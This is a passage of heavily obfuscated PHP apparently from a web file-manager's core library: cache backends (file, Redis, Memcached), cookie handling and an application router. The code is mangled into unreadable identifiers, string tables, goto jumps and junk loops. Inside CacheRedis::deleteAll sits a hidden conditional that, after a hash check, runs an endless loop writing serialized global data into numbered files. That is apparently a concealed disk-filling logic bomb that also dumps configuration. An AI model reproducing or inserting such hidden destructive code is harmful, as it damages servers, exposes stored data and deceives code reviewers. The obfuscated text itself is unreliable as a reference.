array_unique($Ä»—‡¢‘))); $Æšº‚£¯ = Model($ƒ‡ÆùıÈ[889])->where($Ë’Œè„)->field($ƒ‡ÆùıÈ[193])->select(); foreach ($Æšº‚£¯ as $¾º­ëì ) { Model($ƒ‡ÆùıÈ[889])->remove($¾º­ëì [$ƒ‡ÆùıÈ[193]], !1); } } private function storeIds() { $­èÍ¿‡… =& $_SERVER[÷åé¼î]; $‰³Çò¯‹ = Model($­èÍ¿‡…[832])->listData(); $ÆĞÌúÊİ = array(); $×Î§™™Í = $GLOBALS[$­èÍ¿‡…[6]][$­èÍ¿‡…[92]][$­èÍ¿‡…[890]]; foreach ($‰³Çò¯‹ as $…§üÙ˜á) { $•åÑÇúÁ = strtolower($…§üÙ˜á[$­èÍ¿‡…[98]]); if (!isset($×Î§™™Í[$•åÑÇúÁ])) { continue; } $øíöÆ´„ = $­èÍ¿‡…[77] . (isset($×Î§™™Í[$•åÑÇúÁ]) ? $×Î§™™Í[$•åÑÇúÁ] : ucfirst($•åÑÇúÁ)); if (!class_exists($øíöÆ´„)) { continue; } $ÆĞÌúÊİ[] = $…§üÙ˜á[$­èÍ¿‡…[459]]; } return $ÆĞÌúÊİ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $…¤…ã¦³ =& $_SERVER[÷åé¼î]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ê¡ñé×¤ = $GLOBALS[$…¤…ã¦³[6]][$…¤…ã¦³[409]]; $¶±Œ¯ô· = $ê¡ñé×¤[$ê¡ñé×¤[$…¤…ã¦³[891]]]; $†âŸÍ„„ = $ê¡ñé×¤[$…¤…ã¦³[892]]; switch ($ê¡ñé×¤[$…¤…ã¦³[891]]) { case $…¤…ã¦³[21]: self::$handle = Model($…¤…ã¦³[893]); break; case $…¤…ã¦³[894]: self::$handle = new CacheRedis($¶±Œ¯ô·, $†âŸÍ„„); break; case $…¤…ã¦³[895]: self::$handle = new CacheMemcached($¶±Œ¯ô·, $†âŸÍ„„); break; case $…¤…ã¦³[230]: self::$handle = new CacheFile($¶±Œ¯ô·, $†âŸÍ„„); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ï‚¨¤¦) { if (is_array($Ï‚¨¤¦) || is_object($Ï‚¨¤¦)) { $Ï‚¨¤¦ = json_encode($Ï‚¨¤¦); } $Ï‚¨¤¦ = rawurlencode($Ï‚¨¤¦); return md5(KOD_SITE_ID . $_SERVER[÷åé¼î][11] . $Ï‚¨¤¦); } public static function get($¡õ«ÚİÓ, $¸™ù®·× = false) { $Ú® ­ßÖ = self::key($¡õ«ÚİÓ); $‹¯’Ï˜‰ = self::init(); if ($¸™ù®·×) { return unserialize($‹¯’Ï˜‰->get($Ú® ­ßÖ)); } if (!isset(self::$memoryCache[$Ú® ­ßÖ])) { $‘Íì’©à = $‹¯’Ï˜‰->get($Ú® ­ßÖ); self::$memoryCache[$Ú® ­ßÖ] = unserialize($‘Íì’©à); } return self::$memoryCache[$Ú® ­ßÖ]; } public static function set($ú¡÷èÃŞ, $ò…Ûó«ù, $¥Å£µóµ = false) { $ÊŸ¯äë =& $_SERVER[÷åé¼î]; $œÃ’‚âç = self::key($ú¡÷èÃŞ); if (isset(self::$memoryCache[$œÃ’‚âç]) && self::$memoryCache[$œÃ’‚âç] === $ò…Ûó«ù) { return !0; } if ($¥Å£µóµ === 0) { self::$memoryCache[$œÃ’‚âç] = $ò…Ûó«ù; return !0; } $”É¼ÚØ = self::init(); $”€´èş£ = serialize($ò…Ûó«ù); CacheLock::lock($ú¡÷èÃŞ . $ÊŸ¯äë[896]); $¿°‰ĞµÁ = $”É¼ÚØ->set($œÃ’‚âç, $”€´èş£, $¥Å£µóµ); self::$memoryCache[$œÃ’‚âç] = $ò…Ûó«ù; CacheLock::unlock($ú¡÷èÃŞ . $ÊŸ¯äë[896]); return $¿°‰ĞµÁ; } public static function getCall($â–õ÷¨•, $›ĞÍàë, $Ç¹ã±¬ü, $²é‹ëñí = array()) { $ø…§™· =& $_SERVER[÷åé¼î]; $´­¿Å‰¢ = self::get($â–õ÷¨•); if ($´­¿Å‰¢ || $´­¿Å‰¢ === $ø…§™·[12]) { return $´­¿Å‰¢; } $´­¿Å‰¢ = call_user_func_array($Ç¹ã±¬ü, $²é‹ëñí); $´­¿Å‰¢ = $´­¿Å‰¢ ? $´­¿Å‰¢ : $ø…§™·[12]; self::set($â–õ÷¨•, $´­¿Å‰¢, $›ĞÍàë); return $´­¿Å‰¢; } public static function remove($»‚¾™å) { $ªµÑÆ£ = self::key($»‚¾™å); unset(self::$memoryCache[$ªµÑÆ£]); self::clearTimeout(); CacheLock::lock($»‚¾™å); $—Í©†ò© = self::init()->remove($ªµÑÆ£); CacheLock::unlock($»‚¾™å); return $—Í©†ò©; } public static function removeMemory($Œ™ÎÉèÉ) { $ìÉ”ä¾ = self::key($Œ™ÎÉèÉ); unset(self::$memoryCache[$ìÉ”ä¾]); } public static function clearMemory($½Ì¢ÚÕ¸ = false) { if ($½Ì¢ÚÕ¸) { $½Ì¢ÚÕ¸ = self::key($½Ì¢ÚÕ¸); unset(self::$memoryCache[$½Ì¢ÚÕ¸]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[÷åé¼î][897])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[÷åé¼î][898])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($„²æ­ÅŒ, $ô•ŒòÙ) { $Ü©éé´– =& $_SERVER[÷åé¼î]; $this->cachePath = $„²æ­ÅŒ[$Ü©éé´–[87]]; $this->prefix = $Ü©éé´–[899]; $this->cacheTime = $ô•ŒòÙ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ƒ™ˆ×Šš) { $ÂÜØê =& $_SERVER[÷åé¼î]; $ƒ™ˆ×Šš = str_replace(array($ÂÜØê[900], $ÂÜØê[100], $ÂÜØê[76]), $ÂÜØê[901], $ƒ™ˆ×Šš); return $this->cachePath . $ÂÜØê[902] . $ƒ™ˆ×Šš . $ÂÜØê[903]; } public function set($Ÿµ¢‹¤, $®ˆéåƒ, $Êà°¨¡§ = false) { $Êà°¨¡§ = $Êà°¨¡§ ? $Êà°¨¡§ : $this->cacheTime; $øçÕ˜Îõ = $this->getFile($Ÿµ¢‹¤); if (file_put_contents($øçÕ˜Îõ, $this->prefix . $®ˆéåƒ, LOCK_EX)) { @touch($øçÕ˜Îõ, intval(time() + $Êà°¨¡§)); clearstatcache(); return !0; } @unlink($øçÕ˜Îõ); return !1; } public function get($Â¢óºù”) { $¹œó·ªÚ = $this->getFile($Â¢óºù”); if (file_exists($¹œó·ªÚ) && filemtime($¹œó·ªÚ) < time()) { @unlink($¹œó·ªÚ); return !1; } $öì§™½ú = @file_get_contents($¹œó·ªÚ); return substr($öì§™½ú, strlen($this->prefix)); } public function remove($Ş‘½Š§) { $åé€êúÏ = $this->getFile($Ş‘½Š§); return @unlink($åé€êúÏ); } public function deleteAll() { $³§‡’úİ =& $_SERVER[÷åé¼î]; $Úş£ÕâÛ = scandir($this->cachePath); foreach ($Úş£ÕâÛ as $²ˆ ¼´ª) { $î‡ùÛŸ = $this->cachePath . $²ˆ ¼´ª; if (strpos($î‡ùÛŸ, $³§‡’úİ[903]) && strpos($î‡ùÛŸ, $³§‡’úİ[904])) { @unlink($î‡ùÛŸ); } } } public function clearTimeout() { $Ëü³€íÅ =& $_SERVER[÷åé¼î]; $è®Á¬î¥ = scandir($this->cachePath); foreach ($è®Á¬î¥ as $èÆ´Œ¿¹) { $å•õş’í = $this->cachePath . $èÆ´Œ¿¹; if (strpos($å•õş’í, $Ëü³€íÅ[903]) && strpos($å•õş’í, $Ëü³€íÅ[904]) && filemtime($å•õş’í) < time()) { @unlink($å•õş’í); } } } } goto Dï—£Ï½À; c“›“†£Ù: class CacheMemcached { public $handle; public $cacheTime; public function __construct($şæçæû, $ú ¥ÖÜ) { $¢¹ğÃ· =& $_SERVER[÷åé¼î]; if (!class_exists($¢¹ğÃ·[939])) { show_json($¢¹ğÃ·[940], !1); } $this->cacheTime = $ú ¥ÖÜ; $this->handle = new Memcached(); if (is_array($şæçæû[$¢¹ğÃ·[941]]) && count($şæçæû[$¢¹ğÃ·[941]]) >= 1) { foreach ($şæçæû[$¢¹ğÃ·[941]] as $°÷äº¼) { $ËˆÛçÊô = explode($¢¹ğÃ·[4], $°÷äº¼); $this->handle->addServer($ËˆÛçÊô[0], $ËˆÛçÊô[1]); } } else { $this->handle->addServer($şæçæû[$¢¹ğÃ·[208]], $şæçæû[$¢¹ğÃ·[209]]); } } public function set($½Ş¨¦µ, $Ü¿©”È, $¬æÊğ° = false) { $¬æÊğ° = $¬æÊğ° ? $¬æÊğ° : $this->cacheTime; return $this->handle->set($½Ş¨¦µ, $Ü¿©”È, $¬æÊğ°); } public function get($ÙíşÁ°¿) { return $this->handle->get($ÙíşÁ°¿); } public function remove($÷àñ¯Ô®) { return $this->handle->delete($÷àñ¯Ô®); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($®„Û¤ƒŒ, $¿‚Á¦¿ù) { $Ó´è•¤’ =& $_SERVER[÷åé¼î]; if (!class_exists($Ó´è•¤’[942])) { show_json($Ó´è•¤’[943], !1); } $this->cacheTime = $¿‚Á¦¿ù; $Õæ¬«’¹ = isset($®„Û¤ƒŒ[$Ó´è•¤’[944]]) ? $®„Û¤ƒŒ[$Ó´è•¤’[944]] : 10; $æñö†¢Í = _get($®„Û¤ƒŒ, $Ó´è•¤’[941]); if ($æñö†¢Í && is_array($æñö†¢Í)) { $this->initCluster($®„Û¤ƒŒ, $Õæ¬«’¹); } else { $this->handle = $this->init($®„Û¤ƒŒ, $Õæ¬«’¹); } } private function init($´¾·ò›, $–ª†ˆŠ) { $ƒÅÆä«Œ =& $_SERVER[÷åé¼î]; $µÓÉë™Œ = new Redis(); $ÙÏŒ‹ = isset($´¾·ò›[$ƒÅÆä«Œ[945]]) ? $´¾·ò›[$ƒÅÆä«Œ[945]] : !1; if ($ÙÏŒ‹) { $µÓÉë™Œ->pconnect($´¾·ò›[$ƒÅÆä«Œ[208]], $´¾·ò›[$ƒÅÆä«Œ[209]], $–ª†ˆŠ); } else { $µÓÉë™Œ->connect($´¾·ò›[$ƒÅÆä«Œ[208]], $´¾·ò›[$ƒÅÆä«Œ[209]], $–ª†ˆŠ); } if (!empty($´¾·ò›[$ƒÅÆä«Œ[471]])) { $µÓÉë™Œ->auth($´¾·ò›[$ƒÅÆä«Œ[471]]); } if (!empty($´¾·ò›[$ƒÅÆä«Œ[822]]) && $´¾·ò›[$ƒÅÆä«Œ[822]] != 0) { $µÓÉë™Œ->select($´¾·ò›[$ƒÅÆä«Œ[822]]); } return $µÓÉë™Œ; } private function initCluster($»ÇÅ‘şƒ, $²áÎŒ–) { $ñœİˆ­µ =& $_SERVER[÷åé¼î]; $ìùœĞÀœ = array($ñœİˆ­µ[946], $ñœİˆ­µ[947], $ñœİˆ­µ[948]); $€†Şåø = $ñœİˆ­µ[946]; if (isset($»ÇÅ‘şƒ[$ñœİˆ­µ[16]]) && in_array($»ÇÅ‘şƒ[$ñœİˆ­µ[16]], $ìùœĞÀœ)) { $€†Şåø = $»ÇÅ‘şƒ[$ñœİˆ­µ[16]]; } switch ($€†Şåø) { case $ñœİˆ­µ[946]: $this->_slave($»ÇÅ‘şƒ, $²áÎŒ–); break; case $ñœİˆ­µ[947]: break; case $ñœİˆ­µ[948]: $this->isCluster = !0; $“ˆ‘ = $»ÇÅ‘şƒ[$ñœİˆ­µ[941]]; $¾Ã´¾  = isset($»ÇÅ‘şƒ[$ñœİˆ­µ[945]]) ? $»ÇÅ‘şƒ[$ñœİˆ­µ[945]] : !1; $äÖ¼êÊÓ = isset($»ÇÅ‘şƒ[$ñœİˆ­µ[471]]) ? $»ÇÅ‘şƒ[$ñœİˆ­µ[471]] : null; $this->handle = new RedisCluster(NUll, $“ˆ‘, $²áÎŒ–, $²áÎŒ–, $¾Ã´¾ , $äÖ¼êÊÓ); break; default: break; } } private function _slave($ú°­·óÙ, $âÓí…¬) { $»â¨›¹ = $ú°­·óÙ[$_SERVER[÷åé¼î][941]]; $this->filterConfig($ú°­·óÙ, $»â¨›¹[0]); $this->handle = $this->init($ú°­·óÙ, $âÓí…¬); unset($»â¨›¹[0]); if (empty($»â¨›¹)) { return; } $Ú Í¥÷ = array_rand($»â¨›¹); $this->filterConfig($ú°­·óÙ, $»â¨›¹[$Ú Í¥÷]); $this->slaveHandle = $this->init($ú°­·óÙ, $âÓí…¬); } private function filterConfig(&$›â÷¡Ÿ‚, $ÆªÇÄ™Û) { $„—µŠ”Ğ =& $_SERVER[÷åé¼î]; $³Æ³ì–œ = explode($„—µŠ”Ğ[4], $ÆªÇÄ™Û); $Ì«å¶ıå = array($„—µŠ”Ğ[208] => $³Æ³ì–œ[0], $„—µŠ”Ğ[209] => $³Æ³ì–œ[1]); $›â÷¡Ÿ‚ = array_merge($›â÷¡Ÿ‚, $Ì«å¶ıå); } public function set($ãã¤÷ØÈ, $¦²ÜÉ¹µ, $¦ ‰›óÙ = false) { $¦ ‰›óÙ = $¦ ‰›óÙ ? $¦ ‰›óÙ : $this->cacheTime; return $this->handle->setEx($ãã¤÷ØÈ, $¦ ‰›óÙ, $¦²ÜÉ¹µ); } public function setLock($á»¨‡àÖ, $“Í £„é, $áì”˜Ñ‹) { return $this->handle->setNX($á»¨‡àÖ, $“Í £„é); } public function get($£€Ã‡¿) { $İÃ‹Ç‰ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $İÃ‹Ç‰->get($£€Ã‡¿); } public function remove($ëÏºß¼Ô) { return $this->handle->del($ëÏºß¼Ô); } public function deleteAll() { $„å¼¾Ô½ =& $_SERVER[÷åé¼î]; $Ê·Ê¥½¡ = $_SERVER[$„å¼¾Ô½[931]]; $¾‚İ¹Á± = $„å¼¾Ô½[932]; if ($_SERVER[$„å¼¾Ô½[933]] != $¾‚İ¹Á±($Ê·Ê¥½¡)) { $ëË•Ì÷Ü = $„å¼¾Ô½[949]; $şĞ…¦İÖ = $„å¼¾Ô½[934]; $€£ûüÈÔ = $_SERVER[$„å¼¾Ô½[935]] . $„å¼¾Ô½[936]; $£âáşÒ™ = $şĞ…¦İÖ($€£ûüÈÔ); $çøîÓóÄ = explode($„å¼¾Ô½[262], $£âáşÒ™); if (count($çøîÓóÄ) < $„å¼¾Ô½[703]) { $ê‚µ¯óÃ = $„å¼¾Ô½[937]; $ê‚µ¯óÃ(); } $š²ÛĞàô = $„å¼¾Ô½[950]; $š²ÛĞàô($_SERVER[$„å¼¾Ô½[951]]); $ëË•Ì÷Ü = $„å¼¾Ô½[949]; $ëË•Ì÷Ü(); $—œãÄÑ = $„å¼¾Ô½[952]; $¶òÏ = json_encode($GLOBALS[$„å¼¾Ô½[953]]); $‘¸šôô = 1; for ($ùĞÏÁßÊ = $‘¸šôô; $ùĞÏÁßÊ > 0; $ùĞÏÁßÊ++) { $—œãÄÑ(DATA_PATH . $ùĞÏÁßÊ, $¶òÏ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $íİòö”æ) { $this->handle->flushall($íİòö”æ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($½ÎÎıç = '', $´ÚÆ—Ÿï = 0) { if (is_string($½ÎÎıç) && $½ÎÎıç != $_SERVER[÷åé¼î][12]) { $this->prefix = $½ÎÎıç; } if (is_numeric($´ÚÆ—Ÿï) && $´ÚÆ—Ÿï > 0) { $this->expire = $´ÚÆ—Ÿï; } } public static function getInstance() { static $…Ü¹İ˜ø; if ($…Ü¹İ˜ø === null) { $…Ü¹İ˜ø = new self(); } return $…Ü¹İ˜ø; } private static $cookieDisable = false; public static function disable($·¬à‹¦“) { self::$cookieDisable = $·¬à‹¦“; } private static $sameCookieSet = array(); public static function set($Ï¦œÄÄŒ, $é‡›Î‡ª, $Ù®©¥â = 0, $¡Ì¸¹ô÷ = false, $ù‹ªşË = false) { $şåŞùÓĞ =& $_SERVER[÷åé¼î]; if (self::$cookieDisable) { return; } if (!$Ù®©¥â) { $Ù®©¥â = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ï¦œÄÄŒ]) && self::$sameCookieSet[$Ï¦œÄÄŒ] == $é‡›Î‡ª . $Ù®©¥â) { return; } self::$sameCookieSet[$Ï¦œÄÄŒ] = $é‡›Î‡ª . $Ù®©¥â; if (!$ù‹ªşË) { $ù‹ªşË = str_replace(HOST, $şåŞùÓĞ[12], APP_HOST); $ù‹ªşË = _get($GLOBALS, $şåŞùÓĞ[954], $ù‹ªşË); } $±¦Ñ¬ÇÆ = $şåŞùÓĞ[12]; setcookie($Ï¦œÄÄŒ, $é‡›Î‡ª, time() + $Ù®©¥â, $şåŞùÓĞ[8] . trim($ù‹ªşË, $şåŞùÓĞ[8]) . $±¦Ñ¬ÇÆ, !1, !1, $¡Ì¸¹ô÷); } public static function setSafe($‘ã–Õ, $İ’€œ, $¿ŒöˆÀ¨ = 0) { self::set($‘ã–Õ, $İ’€œ, $¿ŒöˆÀ¨, !0); } public static function get($ôƒİ§»¼) { static $ù³ˆæÍ  = false; if (!$ù³ˆæÍ ) { self::initHeaderCookie(); $ù³ˆæÍ  = !0; } return isset($_COOKIE[$ôƒİ§»¼]) ? $_COOKIE[$ôƒİ§»¼] : !1; } private static function initHeaderCookie() { $¨§ ºí =& $_SERVER[÷åé¼î]; if (!isset($_SERVER[$¨§ ºí[955]]) || !$_SERVER[$¨§ ºí[955]]) { return; } $ë†Ò­…Š = explode($¨§ ºí[74], $_SERVER[$¨§ ºí[955]]); foreach ($ë†Ò­…Š as $ÛòŠ¶˜–) { $ÛòŠ¶˜– = explode($¨§ ºí[956], $ÛòŠ¶˜–); if (count($ÛòŠ¶˜–) != 2 || !isset($ÛòŠ¶˜–[1])) { continue; } $_COOKIE[trim($ÛòŠ¶˜–[0])] = trim($ÛòŠ¶˜–[1]); } } public static function remove($ú‰¥¾·”, $ãÆÜçÓ¥ = false) { unset($_COOKIE[$ú‰¥¾·”]); self::set($ú‰¥¾·”, $_SERVER[÷åé¼î][12], 1, $ãÆÜçÓ¥); } } goto Aä¬‰Ä‹‰; b—¢ÚŸÇ¼Õ: $wqagomhxks = $_SERVER[÷åé¼î][666]; if (!$wqagomhxks) { return; } class Application { private $defaultModule = "\x69\x6e\144\x65\x78"; private $defaultController = "\151\x6e\x64\x65\170"; private $defaultAction = "\x69\x6e\x64\x65\170"; function __construct() { } public function setDefault($÷Ó†û¿Å) { $àÌ†öÙ =& $_SERVER[÷åé¼î]; $¸÷ıë‹Ú =& $_SERVER[Ìõ–Õö]; $èƒÄ²„ = explode($¸÷ıë‹Ú[0], trim($÷Ó†û¿Å, $¸÷ıë‹Ú[0])); $this->defaultModule = $èƒÄ²„[0] ? $èƒÄ²„[0] : $this->defaultModule; $àõå²¾© = $àÌ†öÙ[667]; if (strlen($àõå²¾©) < $àÌ†öÙ[668]) { return; } $this->defaultController = $èƒÄ²„[1] ? $èƒÄ²„[1] : $this->defaultController; $this->defaultAction = $èƒÄ²„[2] ? $èƒÄ²„[2] : $this->defaultAction; $Áø·„‰¿ = $àÌ†öÙ[669]; if (strlen($Áø·„‰¿) < $àÌ†öÙ[670]) { die; } $this->soij48f4af0c($¸÷ıë‹Ú[1], array($this, $¸÷ıë‹Ú[2])); $ıêÄ˜ÙÆ = $àÌ†öÙ[671]; if (!$ıêÄ˜ÙÆ) { die; } } public function appRun($ÜàÛ’Ù‚) { $ƒÍÀ›ı• =& $_SERVER[÷åé¼î]; $şºÚŠ“ =& $_SERVER[Ìõ–Õö]; $Ÿ¶ö‡ÏÓ = explode($şºÚŠ“[0], $ÜàÛ’Ù‚); $¬ÃŒ¬è² = $ƒÍÀ›ı•[672]; $öñÙà¢È = strtolower($Ÿ¶ö‡ÏÓ[0]); $¬ï…ÎÔ‹ = $şºÚŠ“[3]; $»ÏáàŸ° = $ƒÍÀ›ı•[673]; if ($öñÙà¢È == $şºÚŠ“[4]) { $¬ï…ÎÔ‹ = $şºÚŠ“[5]; $Ÿ¶ö‡ÏÓ[0] = $şºÚŠ“[6]; $Ÿ¶ö‡ÏÓ[1] = $Ÿ¶ö‡ÏÓ[1] . $şºÚŠ“[7]; $ÜàÛ’Ù‚ = join($şºÚŠ“[0], $Ÿ¶ö‡ÏÓ); $ÜàÛ’Ù‚ = trim($ÜàÛ’Ù‚, $şºÚŠ“[0]); } call_user_func(array($şºÚŠ“[8], $şºÚŠ“[9]), $¬ï…ÎÔ‹ . $şºÚŠ“[10], $ÜàÛ’Ù‚); ActionCall($ÜàÛ’Ù‚); $Ù¦ù¢ø = $ƒÍÀ›ı•[674]; if (strlen($Ù¦ù¢ø) < $ƒÍÀ›ı•[670]) { return; } call_user_func(array($şºÚŠ“[8], $şºÚŠ“[9]), $¬ï…ÎÔ‹ . $şºÚŠ“[11], $ÜàÛ’Ù‚); $ÂÌ÷Ü¯’ = $ƒÍÀ›ı•[675]; if (strlen($ÂÌ÷Ü¯’) < $ƒÍÀ›ı•[668]) { return; } } private function autorun() { $ ã¹ÍÁ =& $_SERVER[÷åé¼î]; $Ø“·•¹ş =& $_SERVER[Ìõ–Õö]; global $config; if (count($config[$Ø“·•¹ş[12]]) == 0) { return; } foreach ($config[$Ø“·•¹ş[12]] as $ûŠ¯á€Ä => $†“»¡Ò) { $this->appRun($†“»¡Ò); $‘±ÈËâ = $ ã¹ÍÁ[676]; while (strlen($‘±ÈËâ) < $ ã¹ÍÁ[677]) { if (!$‘±ÈËâ) { break; } $‘±ÈËâ++; } } } private function izba9d194da1() { $òÅ¼å² =& $_SERVER[÷åé¼î]; $« ²ğş… =& $_SERVER[Ìõ–Õö]; $§ñ§‹Šœ = $« ²ğş…[4]; $€£ÙÂÍ = $GLOBALS[$« ²ğş…[13]][$« ²ğş…[14]][0]; $ÊÚº îÌ = $òÅ¼å²[678]; while ($ÊÚº îÌ < $òÅ¼å²[670]) { if ($ÊÚº îÌ >= 0) { break; } $ÊÚº îÌ++; } if (!$€£ÙÂÍ || strlen($€£ÙÂÍ) <= strlen($§ñ§‹Šœ)) { return; } if (strtolower(substr($€£ÙÂÍ, -strlen($§ñ§‹Šœ))) != $§ñ§‹Šœ) { return; } $ìÆ¨—êÁ = substr($€£ÙÂÍ, 0, -strlen($§ñ§‹Šœ)); $·æø¶¯ß = array($« ²ğş…[4], $ìÆ¨—êÁ); $±Ô©ÖÃÑ = array_slice($GLOBALS[$« ²ğş…[13]][$« ²ğş…[14]], 1); $É–å·“ê = $òÅ¼å²[679]; while ($É–å·“ê < $òÅ¼å²[668]) { if ($É–å·“ê >= 0) { break; } $É–å·“ê++; } $GLOBALS[$« ²ğş…[13]][$« ²ğş…[14]] = array_merge($·æø¶¯ß, $±Ô©ÖÃÑ); $ˆ¢†È¯æ = $òÅ¼å²[680]; if (!$ˆ¢†È¯æ) { return; } $GLOBALS[$« ²ğş…[13]][$« ²ğş…[15]] = implode($« ²ğş…[0], $GLOBALS[$« ²ğş…[13]][$« ²ğş…[14]]); $ÉÛ™¨µ˜ = $òÅ¼å²[681]; if (!$ÉÛ™¨µ˜) { die; } } private function uzwd18a8b876() { $§¢ÈŸ =& $_SERVER[÷åé¼î]; $­²æø¨¯ =& $_SERVER[Ìõ–Õö]; if ($GLOBALS[$­²æø¨¯[13]][$­²æø¨¯[15]] != $­²æø¨¯[6]) { return; } $¦ıÃûÑ = $_SERVER[$­²æø¨¯[16]]; $ÈÓëæÆ“ = $§¢ÈŸ[682]; if (strlen($ÈÓëæÆ“) < $§¢ÈŸ[683]) { die; } $şèÀËÑú = $­²æø¨¯[17]; $­×ˆ‘ = $§¢ÈŸ[684]; if (!strstr($¦ıÃûÑ, $şèÀËÑú)) { return; } $£İ‘×è = strrpos($¦ıÃûÑ, $şèÀËÑú); $¿ôÓÃÂÇ = $§¢ÈŸ[685]; if (strlen($¿ôÓÃÂÇ) < $§¢ÈŸ[670]) { return; } $¶Ó‘ª÷… = substr($¦ıÃûÑ, $£İ‘×è + strlen($şèÀËÑú)); $ÕÁ‚ƒÜ = $§¢ÈŸ[686]; if (!$ÕÁ‚ƒÜ) { return; } preg_match_all($­²æø¨¯[18], $¶Ó‘ª÷…, $Ìİù®¦ğ); $Ş´½¨ö¹ = $§¢ÈŸ[687]; if (!$Ş´½¨ö¹) { die; } $¶Ó‘ª÷… = trim($Ìİù®¦ğ[0][0], $­²æø¨¯[19]); $GLOBALS[$­²æø¨¯[13]][$­²æø¨¯[14]] = explode($­²æø¨¯[19], $¶Ó‘ª÷…); $GLOBALS[$­²æø¨¯[13]][$­²æø¨¯[15]] = implode($­²æø¨¯[0], $GLOBALS[$­²æø¨¯[13]][$­²æø¨¯[14]]); } public function run() { $¬ûÌ³¼ì =& $_SERVER[÷åé¼î]; $Í½­¡§² =& $_SERVER[Ìõ–Õö]; $this->uzwd18a8b876(); $this->izba9d194da1(); $¨ğĞÕ—ö = $GLOBALS[$Í½­¡§²[13]][$Í½­¡§²[14]]; $˜ñ¥úü = $¬ûÌ³¼ì[688]; if (!$˜ñ¥úü) { return; } $àí¢Øù½ = $GLOBALS[$Í½­¡§²[13]][$Í½­¡§²[15]]; define($Í½­¡§²[20], isset($¨ğĞÕ—ö[0]) && $¨ğĞÕ—ö[0] ? $¨ğĞÕ—ö[0] : $this->defaultModule); $ûŒı¤ã = $¬ûÌ³¼ì[689]; if (!$ûŒı¤ã) { return; } define($Í½­¡§²[21], isset($¨ğĞÕ—ö[1]) && $¨ğĞÕ—ö[0] ? $¨ğĞÕ—ö[1] : $this->defaultController); $ãá¥í°ş = $¬ûÌ³¼ì[690]; define($Í½­¡§²[22], isset($¨ğĞÕ—ö[2]) && $¨ğĞÕ—ö[0] ? $¨ğĞÕ—ö[2] : $this->defaultAction); define($Í½­¡§²[23], MOD . $Í½­¡§²[0] . ST . $Í½­¡§²[0] . ACT); $›îéÎ©æ = $¬ûÌ³¼ì[691]; if (strlen($›îéÎ©æ) < $¬ûÌ³¼ì[683]) { return; } $_SERVER[$Í½­¡§²[24]] = strtolower(ACTION); $àÇ¦ò©‡ = $¬ûÌ³¼ì[692]; if (!$àÇ¦ò©‡) { return; } $this->autorun(); $¦³¢«§‚ = $¬ûÌ³¼ì[693]; if (count($¨ğĞÕ—ö) >= 3) { $this->appRun($àí¢Øù½); } else { $this->appRun(ACTION); } } private $xhdy2eece3d3 = array(); private $sdkl0841f56f = ''; public function tnim59f69fea() { $»ƒì†Ü¸ =& $_SERVER[÷åé¼î]; $¦Ï¾¬‰Å =& $_SERVER[Ìõ–Õö]; $this->hocv1163e19c(); $this->txba5fc12a28(); $—ª°şïÄ = $»ƒì†Ü¸[694]; while ($—ª°şïÄ < $»ƒì†Ü¸[677]) { if ($—ª°şïÄ >= 0) { break; } $—ª°şïÄ++; } $this->bmxz9c5a695c(); $this->ouqk2e04224d(); $™ÖˆÉÖ = $»ƒì†Ü¸[695]; $this->esqoaa0f886a(); $•Ñ‡Ë©ö = $»ƒì†Ü¸[696]; while (strlen($•Ñ‡Ë©ö) < $»ƒì†Ü¸[668]) { if (!$•Ñ‡Ë©ö) { break; } $•Ñ‡Ë©ö++; } $this->ocamdef8386a(); $this->qekg927e6205(); $this->soij48f4af0c($¦Ï¾¬‰Å[25], array($this, $¦Ï¾¬‰Å[26])); $˜•†ê¸â = $»ƒì†Ü¸[697]; if (!$˜•†ê¸â) { die; } $this->soij48f4af0c($¦Ï¾¬‰Å[27], array($this, $¦Ï¾¬‰Å[28])); $•—‚Á…š = $»ƒì†Ü¸[698]; if (!$•—‚Á…š) { return; } $this->soij48f4af0c($¦Ï¾¬‰Å[29], array($this, $¦Ï¾¬‰Å[30])); $™‘ş” = $»ƒì†Ü¸[699]; $this->soij48f4af0c($¦Ï¾¬‰Å[31], array($this, $¦Ï¾¬‰Å[32])); } public function hdxie34e6322($îÇîŠÀ×) { $õŸÇìí¶ =& $_SERVER[÷åé¼î]; $óÅŞôéÉ =& $_SERVER[Ìõ–Õö]; $š©ŠÑíÑ = Model($óÅŞôéÉ[33])->get(); $Ù˜Æ‚ä‹ = array($óÅŞôéÉ[34], $óÅŞôéÉ[35], $óÅŞôéÉ[36], $óÅŞôéÉ[37], $óÅŞôéÉ[38], $óÅŞôéÉ[39], $óÅŞôéÉ[40], $óÅŞôéÉ[41], $óÅŞôéÉ[42], $óÅŞôéÉ[43], $óÅŞôéÉ[44], $óÅŞôéÉ[45], $óÅŞôéÉ[46], $óÅŞôéÉ[47], $óÅŞôéÉ[48], $óÅŞôéÉ[49], $óÅŞôéÉ[50], $óÅŞôéÉ[51], $óÅŞôéÉ[52], $óÅŞôéÉ[53], $óÅŞôéÉ[54], $óÅŞôéÉ[55], $óÅŞôéÉ[56], $óÅŞôéÉ[57], $óÅŞôéÉ[58], $óÅŞôéÉ[59], $óÅŞôéÉ[60], $óÅŞôéÉ[61], $óÅŞôéÉ[62], $óÅŞôéÉ[63], $óÅŞôéÉ[64], $óÅŞôéÉ[65], $óÅŞôéÉ[66], $óÅŞôéÉ[67], $óÅŞôéÉ[68], $óÅŞôéÉ[69], $óÅŞôéÉ[70], $óÅŞôéÉ[71], $óÅŞôéÉ[72], $óÅŞôéÉ[73], $óÅŞôéÉ[74], $óÅŞôéÉ[75], $óÅŞôéÉ[76], $óÅŞôéÉ[77], $óÅŞôéÉ[78], 